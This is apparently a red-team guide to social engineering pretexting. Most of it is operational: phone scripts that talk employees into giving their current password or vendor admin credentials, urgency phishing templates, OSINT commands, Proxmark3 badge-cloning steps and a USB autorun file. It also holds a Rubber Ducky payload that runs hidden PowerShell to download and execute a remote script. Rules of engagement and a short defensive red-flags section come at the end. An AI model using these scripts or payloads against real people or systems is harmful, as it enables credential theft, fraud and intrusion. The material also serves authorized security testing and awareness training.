# Pretexting Techniques Guide

> Reference for social engineering pretexting methods including role impersonation, authority exploitation, urgency creation, and rapport building for authorized security assessments.

---

## 1. Pretext Development Framework

A successful pretext requires a believable identity, a plausible reason for contact, and a clear call to action.

```yaml
# Pretext planning template
pretext:
  identity:
    role: "IT Support Technician"
    name: "Mike from IT Helpdesk"
    badge_number: "IT-4472"
    department: "Information Technology"
    
  scenario:
    trigger: "Mandatory security update following recent breach"
    urgency: "Must complete by end of business today"
    authority: "Directive from CISO office"
    
  objective:
    primary: "Obtain VPN credentials for access verification"
    secondary: "Map internal team structure and reporting lines"
    
  props:
    - "Internal ticket reference: INC-2024-8891"
    - "Manager name (from LinkedIn OSINT)"
    - "Recent company announcement reference"
    
  exit_strategy:
    success: "Thank you, your account is now secured"
    failure: "No problem, I'll follow up via email"
    suspicion: "I understand your concern, let me have my manager call you"
```

---

## 2. Authority Exploitation Scripts

```bash
# OSINT gathering for authority-based pretexts
# Find organizational structure
theHarvester -d target.com -b linkedin -l 100

# Identify executives and IT leadership
curl -s "https://www.linkedin.com/company/target-corp/people/" \
  | grep -oP '"title":"[^"]*IT[^"]*"' | sort -u

# Find recent company announcements for context
curl -s "https://target.com/blog" | grep -i "security\|update\|policy"

# Email format discovery
curl -s "https://hunter.io/v2/domain-search?domain=target.com&api_key=$KEY" \
  | jq '.data.pattern'
```

```python
# Vishing (voice phishing) call script generator
pretext_scripts = {
    "it_support": {
        "opening": (
            "Hi {first_name}, this is {fake_name} from the IT Security team. "
            "I'm calling about ticket {ticket_id} regarding the mandatory "
            "password rotation that was announced last week by {ciso_name}."
        ),
        "build_rapport": (
            "I know these calls are inconvenient - I've got about 40 more "
            "people to get through today. This should only take 2 minutes."
        ),
        "request": (
            "I just need to verify your current credentials so I can "
            "confirm the rotation completed successfully on your account. "
            "Can you confirm your username and current password?"
        ),
        "handle_resistance": {
            "why_phone": "Our email system is being patched right now, which is why we're calling directly.",
            "verify_identity": "Absolutely - my extension is 4472, and you can find me in the directory under IT Security.",
            "ask_manager": "Of course, {manager_name} approved this process. Feel free to check with them.",
        },
        "close": "Perfect, your account is now verified. You'll get a confirmation email within the hour."
    },
    "vendor_support": {
        "opening": (
            "Good morning, this is {fake_name} from {vendor} Premier Support. "
            "We're reaching out to all enterprise customers about a critical "
            "vulnerability in version {version}."
        ),
        "request": (
            "To apply the emergency patch, I'll need remote access to your "
            "{vendor} admin console. Can you provide the access URL and "
            "your admin credentials?"
        ),
    }
}

def generate_script(pretext_type, context):
    script = pretext_scripts[pretext_type]
    formatted = {}
    for key, value in script.items():
        if isinstance(value, str):
            formatted[key] = value.format(**context)
        elif isinstance(value, dict):
            formatted[key] = {k: v.format(**context) for k, v in value.items()}
    return formatted
```

---

## 3. Urgency and Scarcity Tactics

```python
# Email pretext templates leveraging psychological triggers
urgency_templates = {
    "security_incident": {
        "subject": "URGENT: Unauthorized access detected on your account",
        "trigger": "fear",
        "time_pressure": "Account will be locked in 2 hours if not verified",
        "authority": "Security Operations Center",
    },
    "compliance_deadline": {
        "subject": "Action Required: Annual compliance certification due today",
        "trigger": "obligation",
        "time_pressure": "Non-compliance reported to management at 5 PM",
        "authority": "Compliance Department / Legal",
    },
    "reward_expiring": {
        "subject": "Your $500 employee recognition award expires today",
        "trigger": "greed/curiosity",
        "time_pressure": "Must claim before midnight or forfeited",
        "authority": "HR / Employee Benefits",
    },
    "executive_request": {
        "subject": "Quick favor needed - {ceo_name}",
        "trigger": "authority/helpfulness",
        "time_pressure": "Need this before my 3 PM board meeting",
        "authority": "CEO / C-suite executive",
    },
}

# Effectiveness scoring based on Cialdini's principles
principles = {
    "reciprocity": "Give something first (free audit, helpful info)",
    "commitment": "Get small yes before big ask",
    "social_proof": "Others in your department already completed this",
    "authority": "Directive from CISO/CEO/Legal",
    "liking": "Build rapport, find common ground",
    "scarcity": "Limited time, account lockout, expiring access",
}
```

---

## 4. Physical Social Engineering

```bash
# Tailgating and physical access pretexts
# Badge cloning with Proxmark3
proxmark3 /dev/ttyACM0
# In proxmark3 console:
# lf search          - Identify card type
# lf hid read        - Read HID card
# lf hid clone       - Clone to blank card
# lf em 410x read    - Read EM4100 cards

# USB drop attack preparation
# Create autorun payload for USB drives
cat > autorun.inf << 'EOF'
[AutoRun]
open=update.exe
action=Install Critical Security Update
label=IT_Security_Update_Q1
icon=shield.ico
EOF

# Rubber Ducky payload for credential harvesting
cat > payload.txt << 'EOF'
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://assessment-server.com/gather.ps1')"
ENTER
EOF
```

---

## 5. Pretext Validation and Testing

```python
# Pretext believability scoring
def score_pretext(pretext):
    criteria = {
        "role_plausibility": 0,      # Is this role common at target org?
        "context_accuracy": 0,       # Does it reference real events/people?
        "urgency_calibration": 0,    # Urgent but not panic-inducing?
        "request_proportionality": 0, # Is the ask reasonable for the role?
        "exit_strategy": 0,          # Can you disengage cleanly?
        "osint_backing": 0,          # Supported by gathered intelligence?
    }
    
    # Score each criterion 1-5
    total = sum(criteria.values())
    max_score = len(criteria) * 5
    
    if total / max_score >= 0.8:
        return "HIGH confidence - proceed"
    elif total / max_score >= 0.6:
        return "MEDIUM confidence - refine before execution"
    else:
        return "LOW confidence - redesign pretext"

# Red team engagement rules
rules_of_engagement = {
    "always": [
        "Carry written authorization at all times",
        "Have emergency contact for client POC",
        "Never impersonate law enforcement",
        "Stop immediately if target shows distress",
        "Document all interactions for debrief",
    ],
    "never": [
        "Threaten physical harm",
        "Exploit personal relationships",
        "Target individuals known to be vulnerable",
        "Continue after being formally challenged by security",
        "Access systems beyond authorized scope",
    ]
}
```

---

## 6. Counter-Pretexting Awareness

```yaml
# Indicators of a social engineering attempt (for defense training)
red_flags:
  communication:
    - Unsolicited contact requesting credentials or access
    - Pressure to act immediately without verification
    - Requests to bypass normal procedures
    - Unfamiliar sender using familiar names/references
    
  verification_steps:
    - "I'll call you back on the number listed in our directory"
    - "Let me verify this with my manager first"
    - "Can you send this request through our ticketing system?"
    - "I'll need to see your badge/authorization in person"
    
  reporting:
    - Note caller ID, email address, and exact request
    - Do not delete suspicious messages (preserve evidence)
    - Report to security team within 15 minutes
    - Alert colleagues who may receive similar attempts
```

All pretexting activities must be conducted under explicit written authorization with defined scope and ethical boundaries. Document all interactions for post-engagement debrief and awareness training development.
